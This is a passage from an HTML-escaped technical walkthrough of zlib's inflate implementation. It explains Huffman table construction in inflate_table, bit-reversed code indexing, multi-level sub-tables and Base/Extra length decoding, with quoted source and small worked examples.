fine.&lt;/quote&gt;&lt;code&gt;        case LEN:
            if (have &amp;gt;= 6 &amp;amp;&amp;amp; left &amp;gt;= 258) {
                RESTORE();
                inflate_fast(strm, out);
                LOAD();
                if (state-&amp;gt;mode == TYPE)
                    state-&amp;gt;back = -1;
                break;
            }
            state-&amp;gt;back = 0;
            for (;;) {
                here = state-&amp;gt;lencode[BITS(state-&amp;gt;lenbits)];
                if ((unsigned)(here.bits) &amp;lt;= bits) break;
                PULLBYTE();
            }
            if (here.op &amp;amp;&amp;amp; (here.op &amp;amp; 0xf0) == 0) {
                last = here;
                for (;;) {
                    here = state-&amp;gt;lencode[last.val +
                            (BITS(last.bits + last.op) &amp;gt;&amp;gt; last.bits)];
                    if ((unsigned)(last.bits + here.bits) &amp;lt;= bits) break;
                    PULLBYTE();
                }
                DROPBITS(last.bits);
                state-&amp;gt;back += last.bits;
            }
            DROPBITS(here.bits);
            state-&amp;gt;back += here.bits;
            state-&amp;gt;length = (unsigned)here.val;
            if ((int)(here.op) == 0) {
                Tracevv((stderr, here.val &amp;gt;= 0x20 &amp;amp;&amp;amp; here.val &amp;lt; 0x7f ?
                        "inflate:         literal '%c'\n" :
                        "inflate:         literal 0x%02x\n", here.val));
                state-&amp;gt;mode = LIT;
                break;
            }
            if (here.op &amp;amp; 32) {
                Tracevv((stderr, "inflate:         end of block\n"));
                state-&amp;gt;back = -1;
                state-&amp;gt;mode = TYPE;
                break;
            }
            if (here.op &amp;amp; 64) {
                strm-&amp;gt;msg = (z_const char *)"invalid literal/length code";
                state-&amp;gt;mode = BAD;
                break;
            }
            state-&amp;gt;extra = (unsigned)(here.op) &amp;amp; 15;
            state-&amp;gt;mode = LENEXT;
                /* fallthrough */&lt;/code&gt;&lt;p&gt;We now enter the decoding process. Again, we fetch a &lt;code&gt;code&lt;/code&gt; from the table and take actions based on its fields to decode the original value.&lt;/p&gt;&lt;code&gt;        case LIT:
            if (left == 0) goto inf_leave;
            *put++ = (unsigned char)(state-&amp;gt;length);
            left--;
            state-&amp;gt;mode = LEN;
            break;&lt;/code&gt;&lt;p&gt;A quick check shows that when &lt;code&gt;here.op == 0&lt;/code&gt;, we switch to &lt;code&gt;state-&amp;gt;mode = LIT&lt;/code&gt; and append &lt;code&gt;here.val&lt;/code&gt; (the literal byte) to &lt;code&gt;strm-&amp;gt;next_out&lt;/code&gt; (&lt;code&gt;put&lt;/code&gt;). Also, &lt;code&gt;here.bits&lt;/code&gt; is the number of bits consumed to decode that symbol; i.e., it’s the code length, and the decoder uses &lt;code&gt;DROPBITS(here.bits)&lt;/code&gt; to consume bits. This is standard Huffman decoding. But there are other decoding forms depending on &lt;code&gt;here.op&lt;/code&gt;—we’ll explain this in the table construction section.&lt;/p&gt;&lt;code&gt;        case LEN:
            if (have &amp;gt;= 6 &amp;amp;&amp;amp; left &amp;gt;= 258) {
                RESTORE();
                inflate_fast(strm, out);
                LOAD();
                if (state-&amp;gt;mode == TYPE)
                    state-&amp;gt;back = -1;
                break;
            }&lt;/code&gt;&lt;p&gt;Back to the code snippet above. If &lt;code&gt;have&lt;/code&gt; and &lt;code&gt;left&lt;/code&gt; are large enough, &lt;code&gt;inflate&lt;/code&gt; calls &lt;code&gt;inflate_fast&lt;/code&gt; for high-speed decoding. The in-function Huffman decoding is slower because it transitions through VM-like states; &lt;code&gt;inflate_fast&lt;/code&gt; operates with full buffers and fewer checks. Therefore, &lt;code&gt;inflate_fast&lt;/code&gt; requires sufficiently large input/output buffers to be safe.&lt;/p&gt;&lt;code&gt;int ZLIB_INTERNAL inflate_table(codetype type, unsigned short FAR *lens,
                                unsigned codes, code FAR * FAR *table,
                                unsigned FAR *bits, unsigned short FAR *work) {&lt;/code&gt;&lt;p&gt;Let’s revisit &lt;code&gt;inflate_table&lt;/code&gt;’s parameters:&lt;/p&gt;&lt;quote&gt;&lt;code&gt;codetype type&lt;/code&gt;: table type (Code, Literal/Length, Distance)&lt;/quote&gt;&lt;code&gt;unsigned short FAR *lens&lt;/code&gt;: array of code lengths&lt;code&gt;unsigned codes&lt;/code&gt;: number of symbols (table entries)&lt;code&gt;code FAR * FAR *table&lt;/code&gt;: output pointer to the constructed table&lt;code&gt;unsigned FAR *bits&lt;/code&gt;: pointer to the number of index bits for the table (may be adjusted)&lt;code&gt;unsigned short FAR *work&lt;/code&gt;: scratch array for sorting, etc.&lt;code&gt;typedef struct {
    unsigned char op;           /* operation, extra bits, table bits */
    unsigned char bits;         /* bits in this part of the code */
    unsigned short val;         /* offset in table or code value */
} code;

/* op values as set by inflate_table():
    00000000 - literal
    0000tttt - table link, tttt != 0 is the number of table index bits
    0001eeee - length or distance, eeee is the number of extra bits
    01100000 - end of block
    01000000 - invalid code
 */&lt;/code&gt;&lt;p&gt;Now, the &lt;code&gt;code&lt;/code&gt; struct. The Huffman table is an array of &lt;code&gt;code&lt;/code&gt; structs; &lt;code&gt;op&lt;/code&gt; determines how to decode, &lt;code&gt;bits&lt;/code&gt; is the code length, and &lt;code&gt;val&lt;/code&gt; holds the value. As the comment indicates, these fields can play different roles depending on &lt;code&gt;op&lt;/code&gt;.&lt;/p&gt;&lt;code&gt;
    /* accumulate lengths for codes (assumes lens[] all in 0..MAXBITS) */
    for (len = 0; len &amp;lt;= MAXBITS; len++)
        count[len] = 0;
    for (sym = 0; sym &amp;lt; codes; sym++)
        count[lens[sym]]++;

    /* bound code lengths, force root to be within code lengths */
    root = *bits;
    for (max = MAXBITS; max &amp;gt;= 1; max--)
        if (count[max] != 0) break;
    if (root &amp;gt; max) root = max;
    if (max == 0) {                     /* no symbols to code at all */
        here.op = (unsigned char)64;    /* invalid code marker */
        here.bits = (unsigned char)1;
        here.val = (unsigned short)0;
        *(*table)++ = here;             /* make a table to force an error */
        *(*table)++ = here;
        *bits = 1;
        return 0;     /* no symbols, but wait for decoding to report error */
    }
    for (min = 1; min &amp;lt; max; min++)
        if (count[min] != 0) break;
    if (root &amp;lt; min) root = min;

    /* generate offsets into symbol table for each length for sorting */
    offs[1] = 0;
    for (len = 1; len &amp;lt; MAXBITS; len++)
        offs[len + 1] = offs[len] + count[len];

    /* sort symbols by length, by symbol order within each length */
    for (sym = 0; sym &amp;lt; codes; sym++)
        if (lens[sym] != 0) work[offs[lens[sym]]++] = (unsigned short)sym;&lt;/code&gt;&lt;p&gt;Let’s step through table construction. First we count, for each code length, how many symbols use that length.&lt;/p&gt;&lt;p&gt;We then determine the minimum and maximum code lengths from &lt;code&gt;count&lt;/code&gt; and set &lt;code&gt;root&lt;/code&gt;, the table’s index bit width. &lt;code&gt;root&lt;/code&gt; initially comes from the &lt;code&gt;bits&lt;/code&gt; argument but may be adjusted based on min/max. That’s why &lt;code&gt;bits&lt;/code&gt; is a pointer: any adjustments made in &lt;code&gt;inflate_table&lt;/code&gt; must also be visible to the caller.&lt;/p&gt;&lt;p&gt;The Huffman table is a simple 1D array, indexed by bits: &lt;code&gt;table[huffman_code] = decoded_value (actually a code struct to decode it)&lt;/code&gt;. Thus, &lt;code&gt;root&lt;/code&gt; is really the number of index bits—i.e., the size of the primary table. If &lt;code&gt;root=7&lt;/code&gt;, the table has entries up to &lt;code&gt;table[127(0b1111111)]&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;If &lt;code&gt;root &amp;gt; max&lt;/code&gt;, set &lt;code&gt;root = max&lt;/code&gt; to avoid wasting space. If &lt;code&gt;root &amp;lt; min&lt;/code&gt;, set &lt;code&gt;root = min&lt;/code&gt;; otherwise you couldn’t store any codes at all.&lt;/p&gt;&lt;p&gt;But if &lt;code&gt;root = min&lt;/code&gt;, how do we store codes longer than &lt;code&gt;root&lt;/code&gt;? Using multi-level tables. As we’ve seen, the &lt;code&gt;op&lt;/code&gt; field can indicate a second-level lookup. For example, suppose there are ten 8‑bit codes and one 9‑bit code. You don’t want to double the table size (from 256 to 512 entries) just for one symbol. So the primary table has 256 entries; all 8‑bit codes and the prefixes of any longer codes are stored there. For longer codes, entries in the primary table point to sub-tables that hold the remaining bits.&lt;/p&gt;&lt;p&gt;We’ll see the exact mechanics below.&lt;/p&gt;&lt;p&gt;Once &lt;code&gt;root&lt;/code&gt; is decided, we build the &lt;code&gt;offs&lt;/code&gt; array to sort symbols by code length and symbol order into &lt;code&gt;work&lt;/code&gt;. The &lt;code&gt;work&lt;/code&gt; array is needed to reconstruct the full Huffman codes from the lengths.&lt;/p&gt;&lt;code&gt;A -&amp;gt; 2 (00)
B -&amp;gt; 3 (110)
C -&amp;gt; 2 (01)
D -&amp;gt; 2 (10)
E -&amp;gt; 3 (111)&lt;/code&gt;&lt;p&gt;To reconstruct codes from lengths, group symbols with the same length and assign codes in order:&lt;/p&gt;&lt;code&gt;A -&amp;gt; 2 (00)
C -&amp;gt; 2 (01)
D -&amp;gt; 2 (10)
B -&amp;gt; 3 (110)
E -&amp;gt; 3 (111)&lt;/code&gt;&lt;p&gt;&lt;code&gt;work&lt;/code&gt; is the array that encodes this ordering; the build loop will walk &lt;code&gt;work&lt;/code&gt; to assign codes.&lt;/p&gt;&lt;code&gt;    /* set up for code type */
    switch (type) {
    case CODES:
        base = extra = work;    /* dummy value--not used */
        match = 20;
        break;
    case LENS:
        base = lbase;
        extra = lext;
        match = 257;
        break;
    default:    /* DISTS */
        base = dbase;
        extra = dext;
        match = 0;
    }&lt;/code&gt;&lt;p&gt;Depending on &lt;code&gt;type&lt;/code&gt;, we set &lt;code&gt;match&lt;/code&gt;, &lt;code&gt;base&lt;/code&gt;, and &lt;code&gt;extra&lt;/code&gt;. These support the Base/Extra decoding mode described below.&lt;/p&gt;&lt;p&gt;Dynamic Huffman table lengths in the stream are usually stored by position (index), since that index is the original value—e.g., index 65 corresponds to ‘A’. This is efficient for literals (0–255). But what about LZ77 length/distance values? Deflate specifies length range 3–258 and distance range 1–32,768, making a direct per‑value table impractical. So lengths and distances use Base/Extra coding.&lt;/p&gt;&lt;p&gt;&lt;code&gt;match&lt;/code&gt; indicates where Base/Extra decoding begins. For Literal/Length, 0–255 are literals and 256 is End of Block; from 257 upward (LZ77 lengths), Base/Extra applies—so &lt;code&gt;match=257&lt;/code&gt;. The Code table doesn’t use Base/Extra at all, so &lt;code&gt;match=20&lt;/code&gt; (greater than the largest code index). Distance uses Base/Extra for all symbols, so &lt;code&gt;match=0&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;&lt;code&gt;base&lt;/code&gt; and &lt;code&gt;extra&lt;/code&gt; select the arrays used for Base/Extra depending on whether we’re building the length or distance table.&lt;/p&gt;&lt;code&gt;    /* initialize state for loop */
    huff = 0;                   /* starting code */
    sym = 0;                    /* starting code symbol */
    len = min;                  /* starting code length */
    next = *table;              /* current table to fill in */
    curr = root;                /* current table index bits */
    drop = 0;                   /* current bits to drop from code for index */
    low = (unsigned)(-1);       /* trigger new sub-table when len &amp;gt; root */
    used = 1U &amp;lt;&amp;lt; root;          /* use root table entries */
    mask = used - 1;            /* mask for comparing low */

    /* process all codes and make table entries */
    for (;;) {
        /* create table entry */
        here.bits = (unsigned char)(len - drop);
        if (work[sym] + 1U &amp;lt; match) {
            here.op = (unsigned char)0;
            here.val = work[sym];
        }
        else if (work[sym] &amp;gt;= match) {
            here.op = (unsigned char)(extra[work[sym] - match]);
            here.val = base[work[sym] - match];
        }
        else {
            here.op = (unsigned char)(32 + 64);         /* end of block */
            here.val = 0;
        }
&lt;/code&gt;&lt;p&gt;This is the main construction loop. We iterate through &lt;code&gt;work&lt;/code&gt;, creating a &lt;code&gt;code&lt;/code&gt; entry for each symbol. If &lt;code&gt;symbol+1 &amp;lt; match&lt;/code&gt;, it’s a normal entry: &lt;code&gt;op=0&lt;/code&gt;, &lt;code&gt;val=symbol&lt;/code&gt;. As we saw in &lt;code&gt;case LIT:&lt;/code&gt;, decoding such an entry emits &lt;code&gt;val&lt;/code&gt;.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Recall: “original value” here means the Huffman-decoded value. In the simple case above, it’s the final literal; with Base/Extra, it’s a special symbol that needs further interpretation.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;If &lt;code&gt;symbol &amp;gt;= match&lt;/code&gt;, we create an entry using the Base/Extra scheme: &lt;code&gt;op&lt;/code&gt; holds the number of extra bits, &lt;code&gt;val&lt;/code&gt; holds the base.&lt;/p&gt;&lt;code&gt;            state-&amp;gt;length = (unsigned)here.val;
            if ((int)(here.op) == 0) {
                Tracevv((stderr, here.val &amp;gt;= 0x20 &amp;amp;&amp;amp; here.val &amp;lt; 0x7f ?
                        "inflate:         literal '%c'\n" :
                        "inflate:         literal 0x%02x\n", here.val));
                state-&amp;gt;mode = LIT;
                break;
            }
            if (here.op &amp;amp; 32) {
                Tracevv((stderr, "inflate:         end of block\n"));
                state-&amp;gt;back = -1;
                state-&amp;gt;mode = TYPE;
                break;
            }
            if (here.op &amp;amp; 64) {
                strm-&amp;gt;msg = (z_const char *)"invalid literal/length code";
                state-&amp;gt;mode = BAD;
                break;
            }
            state-&amp;gt;extra = (unsigned)(here.op) &amp;amp; 15;
            state-&amp;gt;mode = LENEXT;
                /* fallthrough */
        case LENEXT:
            if (state-&amp;gt;extra) {
                NEEDBITS(state-&amp;gt;extra);
                state-&amp;gt;length += BITS(state-&amp;gt;extra);
                DROPBITS(state-&amp;gt;extra);
                state-&amp;gt;back += state-&amp;gt;extra;
            }
            Tracevv((stderr, "inflate:         length %u\n", state-&amp;gt;length));
            state-&amp;gt;was = state-&amp;gt;length;
            state-&amp;gt;mode = DIST;
                /* fallthrough */&lt;/code&gt;&lt;p&gt;To understand Base/Extra, look at the length-decoding routine in &lt;code&gt;inflate&lt;/code&gt;. First, &lt;code&gt;state-&amp;gt;length = here.val&lt;/code&gt; (the base). Then, based on &lt;code&gt;op&lt;/code&gt;, if it’s not a literal/end/invalid, we go to length decoding.&lt;/p&gt;&lt;p&gt;&lt;code&gt;op &amp;amp; 15&lt;/code&gt; extracts the number of extra bits. We then read that many bits and add them to the base to get the final length.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;The&lt;/p&gt;&lt;code&gt;op &amp;amp; 15&lt;/code&gt;is necessary because the&lt;code&gt;lext&lt;/code&gt;/&lt;code&gt;dext&lt;/code&gt;arrays encode flags along with the count of extra bits.&lt;/quote&gt;&lt;code&gt;    static const unsigned short lbase[31] = { /* Length codes 257..285 base */
        3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31,
        35, 43, 51, 59, 67, 83, 99, 115, 131, 163, 195, 227, 258, 0, 0};
    static const unsigned short lext[31] = { /* Length codes 257..285 extra */
        16, 16, 16, 16, 16, 16, 16, 16, 17, 17, 17, 17, 18, 18, 18, 18,
        19, 19, 19, 19, 20, 20, 20, 20, 21, 21, 21, 21, 16, 73, 200};
    static const unsigned short dbase[32] = { /* Distance codes 0..29 base */
        1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193,
        257, 385, 513, 769, 1025, 1537, 2049, 3073, 4097, 6145,
        8193, 12289, 16385, 24577, 0, 0};
    static const unsigned short dext[32] = { /* Distance codes 0..29 extra */
        16, 16, 16, 16, 17, 17, 18, 18, 19, 19, 20, 20, 21, 21, 22, 22,
        23, 23, 24, 24, 25, 25, 26, 26, 27, 27,
        28, 28, 29, 29, 64, 64};&lt;/code&gt;&lt;p&gt;For example, suppose we want to decode length 20. Its code length entry would be at &lt;code&gt;huffman_table[269]&lt;/code&gt;.&lt;/p&gt;&lt;code&gt;here.op = extra - match](257) = extra[12] = lext[12] = 18
here.val = base - match(257)] = base[12] = lbase[12] = 19&lt;/code&gt;&lt;p&gt;The length routine then computes &lt;code&gt;state-&amp;gt;length = 19 + BITS(18 &amp;amp; 15 (2))&lt;/code&gt;. If the stream provides &lt;code&gt;01&lt;/code&gt; as the extra bits, we decode &lt;code&gt;19 + 1 = 20&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;The key idea of Base/Extra: values like 20 (and the range &lt;code&gt;19 + 0b00 ~ 0b11&lt;/code&gt;) are all represented by the same Huffman symbol (index 269); the exact value is determined by reading the extra bits. The table groups ranges by base and uses extra bits to resolve within the range.&lt;/p&gt;&lt;code&gt;        /* replicate for those indices with low len bits equal to huff */
        incr = 1U &amp;lt;&amp;lt; (len - drop);
        fill = 1U &amp;lt;&amp;lt; curr;
        min = fill;                 /* save offset to next table */
        do {
            fill -= incr;
            next[(huff &amp;gt;&amp;gt; drop) + fill] = here;
        } while (fill != 0);

        /* backwards increment the len-bit code huff */
        incr = 1U &amp;lt;&amp;lt; (len - 1);
        while (huff &amp;amp; incr)
            incr &amp;gt;&amp;gt;= 1;
        if (incr != 0) {
            huff &amp;amp;= incr - 1;
            huff += incr;
        }
        else
            huff = 0;

        /* go to next symbol, update count, len */
        sym++;
        if (--(count[len]) == 0) {
            if (len == max) break;
            len = lens[work[sym]];
        }&lt;/code&gt;&lt;p&gt;After creating a &lt;code&gt;code&lt;/code&gt; entry, we write it into the table at multiple positions. &lt;code&gt;drop&lt;/code&gt; is used for sub-tables (multi-level); it’s 0 in the primary table.&lt;/p&gt;&lt;p&gt;The loop writes &lt;code&gt;here&lt;/code&gt; into &lt;code&gt;next[huff + (0, incr, incr*2, …, fill-incr)]&lt;/code&gt;. Before explaining why, let’s note something important:&lt;/p&gt;&lt;code&gt;A -&amp;gt; 00
B -&amp;gt; 01
C -&amp;gt; 10
D -&amp;gt; 110
E -&amp;gt; 111&lt;/code&gt;&lt;p&gt;If we naively stored:&lt;/p&gt;&lt;code&gt;next[0(0b00)] = here(op=0, bits=2, val='A')
next[1(0b01)] = here(op=0, bits=2, val='B')
next[2(0b10)] = here(op=0, bits=2, val='C')
next[6(0b110)] = here(op=0, bits=3, val='D')
next[7(0b111)] = here(op=0, bits=3, val='E')&lt;/code&gt;&lt;p&gt;that looks reasonable—but it’s wrong.&lt;/p&gt;&lt;p&gt;Consider compressing “CB”:&lt;/p&gt;&lt;code&gt;0b10(C) &amp;lt;&amp;lt; 0 + 0b01(B) &amp;lt;&amp;lt; 2 = 0b0110&lt;/code&gt;&lt;quote&gt;&lt;p&gt;Bits are packed least significant bit first; simply concatenating as&lt;/p&gt;&lt;code&gt;0b1001&lt;/code&gt;would make bitwise decoding impossible.&lt;/quote&gt;&lt;p&gt;The compressed bits for &lt;code&gt;CB&lt;/code&gt; (0b0110) match those for &lt;code&gt;D&lt;/code&gt; (0b110). Even though the code set is prefix-free when read left-to-right, Deflate uses a bitstream where the trailing bits act as prefixes due to LSB-first packing. To handle this, we reverse the bit order when building indices:&lt;/p&gt;&lt;code&gt;next[0(0b00)] = here(op=0, bits=2, val='A')
next[2(0b10)] = here(op=0, bits=2, val='B')
next[1(0b01)] = here(op=0, bits=2, val='C')
next[3(0b011)] = here(op=0, bits=3, val='D')
next[7(0b111)] = here(op=0, bits=3, val='E')&lt;/code&gt;&lt;p&gt;So the correct index order is 0,2,1,3,7 rather than 0,1,2,6,7.&lt;/p&gt;&lt;code&gt;        /* replicate for those indices with low len bits equal to huff */
        incr = 1U &amp;lt;&amp;lt; (len - drop);
        fill = 1U &amp;lt;&amp;lt; curr;
        min = fill;                 /* save offset to next table */
        do {
            fill -= incr;
            next[(huff &amp;gt;&amp;gt; drop) + fill] = here;
        } while (fill != 0);&lt;/code&gt;&lt;p&gt;Back to the loop. &lt;code&gt;huff&lt;/code&gt; holds the (bit-reversed) Huffman code in progress. We don’t just store at &lt;code&gt;next[huff]&lt;/code&gt;; we fill out all positions differing only in the unused high bits of the primary table.&lt;/p&gt;&lt;p&gt;&lt;code&gt;fill&lt;/code&gt; is &lt;code&gt;1 &amp;lt;&amp;lt; curr&lt;/code&gt; (table size), and &lt;code&gt;incr&lt;/code&gt; is &lt;code&gt;1 &amp;lt;&amp;lt; len&lt;/code&gt; (or &lt;code&gt;1 &amp;lt;&amp;lt; (len - drop)&lt;/code&gt; for sub-tables). So the effect is:&lt;/p&gt;&lt;quote&gt;&lt;p&gt;If the primary table has&lt;/p&gt;&lt;code&gt;curr=root&lt;/code&gt;bits, and&lt;code&gt;huff=0b111&lt;/code&gt;with code length 3, then fill covers:&lt;/quote&gt;&lt;p&gt;We’re enumerating the higher bits that are irrelevant to this code length. This allows constant-time decoding:&lt;/p&gt;&lt;code&gt;next[0(0b00), 4(0b100)] = here(op=0, bits=2, val='A')
next[2(0b10), 6(0b110)] = here(op=0, bits=2, val='B')
next[1(0b01), 6(0b101)] = here(op=0, bits=2, val='C')
next[3(0b011)] = here(op=0, bits=3, val='D')
next[7(0b111)] = here(op=0, bits=3, val='E')&lt;/code&gt;&lt;p&gt;When decoding &lt;code&gt;AC&lt;/code&gt; (0b0100), we can immediately index &lt;code&gt;next[0b100]&lt;/code&gt; with &lt;code&gt;BITS(root)&lt;/code&gt; and decode ‘A’ without checking code lengths; then drop 2 bits and continue.&lt;/p&gt;&lt;p&gt;Back to the actual decoding:&lt;/p&gt;&lt;code&gt;here = state-&amp;gt;lencode[BITS(state-&amp;gt;lenbits)];&lt;/code&gt;&lt;p&gt;This implements the same idea: index with fixed &lt;code&gt;lenbits&lt;/code&gt; and decode immediately. The &lt;code&gt;while&lt;/code&gt; loop plus &lt;code&gt;fill/incr&lt;/code&gt; achieve this optimization.&lt;/p&gt;&lt;code&gt;        /* backwards increment the len-bit code huff */
        incr = 1U &amp;lt;&amp;lt; (len - 1);
        while (huff &amp;amp; incr)
            incr &amp;gt;&amp;gt;= 1;
        if (incr != 0) {
            huff &amp;amp;= incr - 1;
            huff += incr;
        }
        else
            huff = 0;&lt;/code&gt;&lt;p&gt;This updates &lt;code&gt;huff&lt;/code&gt; in bit-reversed order:&lt;/p&gt;&lt;code&gt;00,01,10,110,111 -&amp;gt; X
00,10,01,011,111 -&amp;gt; O&lt;/code&gt;&lt;p&gt;i.e., increment with bit-reversed semantics.&lt;/p&gt;&lt;code&gt;        /* go to next symbol, update count, len */
        sym++;
        if (--(count[len]) == 0) {
            if (len == max) break;
            len = lens[work[sym]];
        }&lt;/code&gt;&lt;p&gt;Move to the next symbol and update the working code length.&lt;/p&gt;&lt;code&gt;        /* create new sub-table if needed */
        if (len &amp;gt; root &amp;amp;&amp;amp; (huff &amp;amp; mask) != low) {
            /* if first time, transition to sub-tables */
            if (drop == 0)
                drop = root;

            /* increment past last table */
            next += min;            /* here min is 1 &amp;lt;&amp;lt; curr */

            /* determine length of next table */
            curr = len - drop;
            left = (int)(1 &amp;lt;&amp;lt; curr);
            while (curr + drop &amp;lt; max) {
                left -= count[curr + drop];
                if (left &amp;lt;= 0) break;
                curr++;
                left &amp;lt;&amp;lt;= 1;
            }

            /* check for enough space */
            used += 1U &amp;lt;&amp;lt; curr;

            /* point entry in root table to sub-table */
            low = huff &amp;amp; mask;
            (*table)[low].op = (unsigned char)curr;
            (*table)[low].bits = (unsigned char)root;
            (*table)[low].val = (unsigned short)(next - *table);
        }
    }&lt;/code&gt;&lt;p&gt;This creates a sub-table when &lt;code&gt;len &amp;gt; root&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Let’s illustrate with the earlier example:&lt;/p&gt;&lt;code&gt;next[0(0b00), 4(0b100)] = here(op=0, bits=2, val='A')
next[2(0b10), 6(0b110)] = here(op=0, bits=2, val='B')
next[1(0b01), 5(0b101)] = here(op=0, bits=2, val='C')
next[3(0b011)] = here(op=0, bits=3, val='D')
next[7(0b111)] = here(op=0, bits=3, val='E')&lt;/code&gt;&lt;p&gt;Assume &lt;code&gt;root=2&lt;/code&gt; (for illustration), so 3‑bit codes require a sub-table.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Due to default&lt;/p&gt;&lt;code&gt;state-&amp;gt;lenbits&lt;/code&gt;, you wouldn’t actually see&lt;code&gt;root=2&lt;/code&gt;with multi-level tables in practice; we’re using small numbers for clarity.&lt;/quote&gt;&lt;code&gt;next[0(0b00)] = here(op=0, bits=2, val='A')
next[2(0b10)] = here(op=0, bits=2, val='B')
next[1(0b01)] = here(op=0, bits=2, val='C')&lt;/code&gt;&lt;p&gt;Codes of length ≤2 fit in the primary table.&lt;/p&gt;&lt;code&gt;            if (drop == 0)
                drop = root;

            /* increment past last table */
            next += min;            /* here min is 1 &amp;lt;&amp;lt; curr */&lt;/code&gt;&lt;p&gt;We set &lt;code&gt;drop&lt;/code&gt; (the number of lower bits to ignore when indexing sub-tables) and advance &lt;code&gt;next&lt;/code&gt; to the end of the current table—this is where the sub-table will live.&lt;/p&gt;&lt;p&gt;Now the sub-table is ready: &lt;code&gt;next&lt;/code&gt; points to it, and &lt;code&gt;drop=root&lt;/code&gt; causes future &lt;code&gt;huff&lt;/code&gt; indices to ignore the lower &lt;code&gt;root&lt;/code&gt; bits.&lt;/p&gt;&lt;p&gt;On subsequent iterations, entries for the longer codes are placed into the sub-table:&lt;/p&gt;&lt;code&gt;next += 1 &amp;lt;&amp;lt; curr
next[0(0b011 &amp;gt;&amp;gt; 2)] = here(op=0, bits=1 (3-2), val='D')
next[1(0b111 &amp;gt;&amp;gt; 2)] = here(op=0, bits=1 (3-2), val='E')&lt;/code&gt;&lt;p&gt;Note &lt;code&gt;here.bits = len - drop&lt;/code&gt;, so the sub-table stores only the remaining bits.&lt;/p&gt;&lt;code&gt;            /* point entry in root table to sub-table */
            low = huff &amp;amp; mask;
            (*table)[low].op = (unsigned char)curr;
            (*table)[low].bits = (unsigned char)root;
            (*table)[low].val = (unsigned short)(next - *table);&lt;/code&gt;&lt;p&gt;We also write into the primary table an entry that points to the sub-table. The final multi-level table looks like:&lt;/p&gt;&lt;code&gt;next[0(0b00)] = here(op=0, bits=2, val='A')
next[2(0b10)] = here(op=0, bits=2, val='B')
next[1(0b01)] = here(op=0, bits=2, val='C')

next[3(0b011 &amp;amp; mask( (1 &amp;lt;&amp;lt; 2) - 1) )] = here(op=2, bits=2, val=4)

next += 1 &amp;lt;&amp;lt; curr
next[0(0b011 &amp;gt;&amp;gt; 2)] = here(op=0, bits=1 (3-2), val='D')
next[1(0b111 &amp;gt;&amp;gt; 2)] = here(op=0, bits=1 (3-2), val='E')&lt;/code&gt;&lt;p&gt;Decoding a 3‑bit code like ‘E’ works like this: first-level lookup at &lt;code&gt;0b011 &amp;amp; mask = 0b11&lt;/code&gt; yields &lt;code&gt;here(op=2, bits=2, val=4)&lt;/code&gt;, so we consume 2 bits and jump to the sub-table (&lt;code&gt;next += 4&lt;/code&gt;). Then we use the next bit (1) to index the sub-table, yielding &lt;code&gt;here(op=0, bits=1, val='E')&lt;/code&gt;; we consume 1 bit and emit ‘E’.&lt;/p&gt;&lt;code&gt;    /* fill in remaining table entry if code is incomplete (guaranteed to have
       at most one remaining entry, since if the code is incomplete, the
       maximum code length that was allowed to get this far is one bit) */
    if (huff != 0) {
        here.op = (unsigned char)64;            /* invalid code marker */
        here.bits = (unsigned char)(len - drop);
        here.val = (unsigned short)0;
        next[huff] = here;
    }

    /* set return parameters */
    *table += used;
    *bits = root;
    return 0;&lt;/code&gt;&lt;p&gt;Finally, if the code set is incomplete, the remaining entry is filled with an invalid code marker, then &lt;code&gt;bits&lt;/code&gt; is updated and the function returns.&lt;/p&gt;&lt;code&gt;void ZLIB_INTERNAL inflate_fast(z_streamp strm, unsigned start) {
    struct inflate_state FAR *state;
    z_const unsigned char FAR *in;      /* local strm-&amp;gt;next_in */
    z_const unsigned char FAR *last;    /* have enough input while in &amp;lt; last */
    unsigned char FAR *out;     /* local strm-&amp;gt;next_out */
    unsigned char FAR *beg;     /* inflate()'s initial strm-&amp;gt;next_out */
    unsigned char FAR *end;     /* while out &amp;lt; end, enough space available */
#ifdef INFLATE_STRICT
    unsigned dmax;              /* maximum distance from zlib header */
#endif
    unsigned wsize;             /* window size or zero if not using window */
    unsigned whave;             /* valid bytes in the window */
    unsigned wnext;             /* window write index */
    unsigned char FAR *window;  /* allocated sliding window, if wsize != 0 */
    unsigned long hold;         /* local strm-&amp;gt;hold */
    unsigned bits;              /* local strm-&amp;gt;bits */
    code const FAR *lcode;      /* local strm-&amp;gt;lencode */
    code const FAR *dcode;      /* local strm-&amp;gt;distcode */
    unsigned lmask;             /* mask for first level of length codes */
    unsigned dmask;             /* mask for first level of distance codes */
    code const *here;           /* retrieved table entry */
    unsigned op;                /* code bits, operation, extra bits, or */
                                /*  window position, window bytes to copy */
    unsigned len;               /* match length, unused bytes */
    unsigned dist;              /* match distance */
    unsigned char FAR *from;    /* where to copy match from */

    /* copy state to local variables */
    state = (struct inflate_state FAR *)strm-&amp;gt;state;
    in = strm-&amp;gt;next_in;
    last = in + (strm-&amp;gt;avail_in - 5);
    out = strm-&amp;gt;next_out;
    beg = out - (start - strm-&amp;gt;avail_out);
    end = out + (strm-&amp;gt;avail_out - 257);
#ifdef INFLATE_STRICT
    dmax = state-&amp;gt;dmax;
#endif
    wsize = state-&amp;gt;wsize;
    whave = state-&amp;gt;whave;
    wnext = state-&amp;gt;wnext;
    window = state-&amp;gt;window;
    hold = state-&amp;gt;hold;
    bits = state-&amp;gt;bits;
    lcode = state-&amp;gt;lencode;
    dcode = state-&amp;gt;distcode;
    lmask = (1U &amp;lt;&amp;lt; state-&amp;gt;lenbits) - 1;
    dmask = (1U &amp;lt;&amp;lt; state-&amp;gt;distbits) - 1;&lt;/code&gt;&lt;p&gt;Time to analyze &lt;code&gt;inflate_fast&lt;/code&gt;.&lt;/p&gt;&lt;code&gt;    do {
        if (bits &amp;lt; 15) {
            hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
            bits += 8;
            hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
            bits += 8;
        }
.....
.....
.....
